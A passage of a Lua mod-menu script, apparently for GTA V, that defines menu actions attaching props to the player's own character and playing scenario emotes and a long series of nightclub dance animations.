    attachto(-0.02, 0.0, -1.95, players.user(), 0.0, 0.0, -20.0, 390860802, 28422, false, false)
    play_anim("rcmepsilonism8", "worship_base", -1)
end)

menu.action(scenarios_vroot, "Interviewer", {""}, "", function(on_click)
    request_model_load(-921000564)
    attachto(0.09, 0.03, -0.01, players.user(), -80.0, 0.0, -6.0, -921000564, 57005, false, false)
    play_anim("missmic4premiere", "interview_short_lazlow", -1)
end)

menu.action(scenarios_vroot, "Irish", {""}, "", function(on_click)
    request_model_load(1772380287)
    attachto(0.0, 0.012, 0.102, players.user(), 0.0, 0.0, 0.0, 1772380287, 28422, false, false)
    play_anim("amb@world_human_bum_freeway@male@base", "base", -1)
end)

menu.action(scenarios_vroot, "Janitor", {""}, "", function(on_click)
    request_model_load(-113902346)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, -113902346, 28422, false, false)
    play_anim("amb@world_human_janitor@male@idle_a", "idle_a", -1)
end)

menu.action(scenarios_vroot, "Leaf Blower", {""}, "", function(on_click)
    request_model_load(1603835013)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, 1603835013, 28422, false, false)
    play_anim("amb@code_human_wander_gardener_leaf_blower@base", "static", -1)
end)

menu.action(scenarios_vroot, "Mugshot", {""}, "", function(on_click)
    request_model_load(-1623189257)
    attachto(0.12, 0.24, 0.0, players.user(), 5.0, 0.0, 70.0, -1623189257, 58868, false, false)
    play_anim("mp_character_creation@customise@male_a", "loop", -1)
end)

menu.action(scenarios_vroot, "News Reporter", {""}, "", function(on_click)
    request_model_load(-921000564)
    attachto(0.11, 0.04, 0.0, players.user(), -20.0, 107.0, 24.0, -921000564, 18905, false, false)
    play_anim("anim@random@shop_clothes@watches", "base", -1)
end)

menu.action(scenarios_vroot, "Paint Brush", {""}, "", function(on_click)
    request_model_load(1807682983)
    attachto(0.11, 0.15, 0.04, players.user(), 50.0, 150.0, 90.0, 1807682983, 57005, false, false)
    play_anim("oddjobs@assassinate@multi@windowwasher", "_wash_loop", -1)
end)

menu.action(scenarios_vroot, "Paparazzi", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_PAPARAZZI", 0, true)
end)

menu.action(scenarios_vroot, "Phone Recording", {""}, "", function(on_click)
    TASK.TASK_START_SCENARIO_IN_PLACE(PLAYER.PLAYER_PED_ID(), "WORLD_HUMAN_MOBILE_FILM_SHOCKING", 0, true)
end)

menu.action(scenarios_vroot, "Pizza Delivery", {""}, "", function(on_click)
    request_model_load(604847691)
    attachto(0.0, -0.076, 0.024, players.user(), 0.0, 0.0, 30.0, 604847691, 28422, false, false)
    request_model_load(604847691)
    attachto(0.0, -0.076, 0.09, players.user(), 0.0, 0.0, 30.0, 604847691, 28422, false, false)
    play_anim("anim@move_f@waitress", "idle", -1)
end)

menu.action(scenarios_vroot, "Read Book", {""}, "", function(on_click)
    request_model_load(-1832227997)
    attachto(0.13, 0.0, -0.01, players.user(), 0.0, -150.0, -100.0, -1832227997, 6286, false, false)
    play_anim("cellphone@", "cellphone_text_read_base", -1)
end)

menu.action(scenarios_vroot, "Rose", {""}, "", function(on_click)
    request_model_load(-1048509434)
    attachto(0.07, -0.05, 0.05, players.user(), -100.0, 0.0, -20.0, -1048509434, 18905, false, false)
    play_anim("anim@heists@humane_labs@finale@keycards", "ped_a_enter_loop", -1)
end)

menu.action(scenarios_vroot, "Rugby Ball", {""}, "", function(on_click)
    request_model_load(516221692)
    attachto(0.0, 0.0, 0.0, players.user(), 50.0, 10.0, 0.0, 516221692, 60309, false, false)
	play_anim("anim@sports@ballgame@handball@", "ball_idle", -1)
end)

menu.action(scenarios_vroot, "Selfie (Chest Bump)", {""}, "", function(on_click)
    request_model_load(-511116411)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, -511116411, 28422, false, false)
    play_animstationary("cellphone@self@franklin@", "chest_bump", -1)
end)

menu.action(scenarios_vroot, "Selfie (Peace)", {""}, "", function(on_click)
    request_model_load(-511116411)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, -511116411, 28422, false, false)
    play_animstationary("cellphone@self@franklin@", "peace", -1)
end)

menu.action(scenarios_vroot, "Selfie (West Coast)", {""}, "", function(on_click)
    request_model_load(-511116411)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, -511116411, 28422, false, false)
    play_animstationary("cellphone@self@franklin@", "west_coast", -1)
end)

menu.action(scenarios_vroot, "Space Pistol", {""}, "", function(on_click)
    request_model_load(-1114972153)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, -1114972153, 28422, false, false)
    play_anim("amb@world_human_superhero@male@space_pistol@idle_a", "idle_a", -1)
end)

menu.action(scenarios_vroot, "Sponge Clean A", {""}, "", function(on_click)
    request_model_load(-678752633)
    attachto(0.0, 0.0, -0.01, players.user(), 90.0, 0.0, 0.0, -678752633, 28422, false, false)
    play_anim("amb@world_human_maid_clean@", "base", -1)
end)

menu.action(scenarios_vroot, "Sponge Clean B", {""}, "", function(on_click)
    request_model_load(-678752633)
    attachto(0.0, 0.0, -0.01, players.user(), 90.0, 0.0, 0.0, -678752633, 28422, false, false)
    play_anim("timetable@floyd@clean_kitchen@base", "base", -1)
end)

menu.action(scenarios_vroot, "Spray Graffiti", {""}, "", function(on_click)
    request_model_load(1749718958)
    attachto(0.002, -0.018, -0.028, players.user(), -70.0, 40.0, -50.0, 1749718958, 6286, false, false)
    play_anim("anim@scripted@freemode@postertag@graffiti_spray@male@", "spray_can_var_01_male", -1)
end)

menu.action(scenarios_vroot, "Student", {""}, "", function(on_click)
    request_model_load(0xa7904cef)
    attachto(-0.05, -0.01, -0.07, players.user(), 20.0, -8.0, 0.0, 0xa7904cef, 6286, false, false)
    play_anim("rcmepsilonism8", "bag_handler_idle_a", -1)
end)

menu.action(scenarios_vroot, "Unicorn Dance", {""}, "", function(on_click)
    request_model_load(-1916111695)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, -1916111695, 28422, false, false)
    play_animstationary("anim@amb@nightclub@lazlow@hi_dancefloor@", "crowddance_mi_06_base_laz", -1)
end)

menu.action(scenarios_vroot, "Waiter (Burger Tray)", {""}, "", function(on_click)
    request_model_load(-1455204349)
    attachto(0.17, -0.03, 0.0, players.user(), -15.0, -179.0, -61.0, -1455204349, 57005, false, false)
    play_anim("anim@move_f@waitress", "idle", -1)
end)

menu.action(scenarios_vroot, "Waiter (Cluckin Bell)", {""}, "", function(on_click)
    request_model_load(1388727113)
    attachto(0.081, -0.07, 0.235, players.user(), -153.0, 110.0, -30.0, 1388727113, 60309, false, false)
    play_anim("anim@heists@box_carry@", "idle", -1)
end)

menu.action(scenarios_vroot, "Waiter (Drinks)", {""}, "", function(on_click)
    request_model_load(79245803)
    attachto(0.17, -0.03, 0.0, players.user(), -15.0, -179.0, -61.0, 79245803, 57005, false, false)
    play_anim("anim@move_f@waitress", "idle", -1)
end)

menu.action(scenarios_vroot, "Walking Stick", {""}, "", function(on_click)
    request_model_load(1152510020)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, 1152510020, 28422, false, false)
    play_anim("move_characters@lester@waiting", "lester_waitidle_base", -1)
end)

menu.action(scenarios_vroot, "Wedding Proposal", {""}, "", function(on_click)
    play_animstationary("amb@medic@standing@kneel@base", "base", -1)
	play_anim("anim@weapons@flashlight@", "aim_high_loop", -1)
	request_model_load(-1407761612)
    attachto(0.048, 0.105, 0.013, players.user(), -10.0, -90.0, -140.0, -1407761612, 28422, false, false)
end)

----- DANCES -----

menu.action(dances_root, "Attach Glowsticks", {""}, "", function(on_click)
    request_model_load(-970962656)
    attachto(0.0700, 0.1400, 0.0, players.user(), -80.0, 20.0, 0.0, -970962656, 28422, false, false)
    request_model_load(-970962656)
    attachto(0.0700, 0.0900, 0.0, players.user(), -120.0, -20.0, 0.0, -970962656, 60309, false, false)
end)

----- Nightclub High/Med/Low -----

menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v1_female^1", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v1_female^2", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 3", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v1_female^3", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 4", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v1_female^4", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 5", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v1_female^5", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 6", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v1_female^6", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 7", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v2_female^1", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 8", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v2_female^2", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 9", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v2_female^3", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 10", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v2_female^4", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 11", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v2_female^5", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 12", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_09_v2_female^6", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 13", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_11_v1_female^1", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 14", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_11_v1_female^2", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 15", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_11_v1_female^3", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 16", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_11_v1_female^4", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 17", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_11_v1_female^5", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 18", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_11_v1_female^6", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 19", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_11_v2_female^1", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 20", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_11_v2_female^2", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 21", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_11_v2_female^3", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 22", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_11_v2_female^4", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 23", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_11_v2_female^5", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 24", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_11_v2_female^6", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 25", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v1_female^1", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 26", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v1_female^2", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 27", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v1_female^3", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 28", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v1_female^4", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 29", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v1_female^5", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 30", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v1_female^6", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 31", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v2_female^1", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 32", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v2_female^2", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 33", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v2_female^3", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 34", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v2_female^4", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 35", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v2_female^5", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 36", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_13_v2_female^6", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 37", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_15_v1_female^1", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 38", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_15_v1_female^2", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 39", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_15_v1_female^3", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 40", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_15_v1_female^4", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 41", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_15_v1_female^5", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 42", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_15_v1_female^6", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 43", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_15_v2_female^1", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 44", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_15_v2_female^2", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 45", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_15_v2_female^3", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 46", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_15_v2_female^4", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 47", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_15_v2_female^5", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 48", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_15_v2_female^6", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 49", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v1_female^1", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 50", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v1_female^2", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 51", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v1_female^3", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 52", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v1_female^4", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 53", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v1_female^5", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 54", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v1_female^6", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 55", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v2_female^1", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 56", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v2_female^2", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 57", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v2_female^3", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 58", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v2_female^4", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 59", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v2_female^5", -1)
end)
menu.action(dances_vroot_nightclubhigh, "Nightclub High Intensity 60", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@hi_intensity", "hi_dance_facedj_17_v2_female^6", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v1_female^1", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v1_female^2", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 3", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v1_female^3", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 4", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v1_female^4", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 5", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v1_female^5", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 6", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v1_female^6", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 7", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v2_female^1", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 8", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v2_female^2", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 9", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v2_female^3", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 10", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v2_female^4", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 11", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v2_female^5", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 12", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_09_v2_female^6", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 13", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_11_v1_female^1", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 14", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_11_v1_female^2", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 15", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_11_v1_female^3", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 16", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_11_v1_female^4", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 17", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_11_v1_female^5", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 18", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_11_v1_female^6", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 19", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_11_v2_female^1", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 20", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_11_v2_female^2", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 21", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_11_v2_female^3", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 22", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_11_v2_female^4", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 23", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_11_v2_female^5", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 24", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_11_v2_female^6", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 25", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v1_female^1", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 26", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v1_female^2", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 27", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v1_female^3", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 28", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v1_female^4", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 29", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v1_female^5", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 30", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v1_female^6", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 31", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v2_female^1", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 32", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v2_female^2", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 33", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v2_female^3", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 34", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v2_female^4", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 35", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v2_female^5", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 36", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v2_female^6", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 37", {""}, "", function(on_click)
